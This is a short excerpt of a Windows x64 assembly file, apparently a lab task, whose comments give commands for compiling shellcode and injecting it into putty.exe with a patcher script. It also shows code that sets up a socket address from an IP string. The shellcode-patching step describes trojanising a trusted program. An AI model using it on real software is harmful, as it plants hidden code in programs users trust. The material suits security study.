...
;; .
;; Compile executable:
;; $ nasm -f win64 task3_exp.asm -o task3_exp.obj && gcc task3_exp.obj -o task3_exp.exe && ./task3_exp.exe
;; .
;; Compile shellcode:
;; $ nasm -f bin task3_sc.asm -o task3_sc.obj && python ../patcher.py --exe putty.exe --sc task3_sc.obj
;; .
;; Format:  https://github.com/dedkuzmich/nasmfmt_operands_indent
;; $ nasmfmt -oi 8 task3_exp.asm
...
WinMain:
        ...
        mov     rcx, 2                         ; AF_INET
        lea     rdx, [szIp]
        lea     r8, [r12 + 4]                  ; stAddrClient.sin_addr
        call    qword [pInetPtonA]             ; stAddrClient.sin_addr = IP
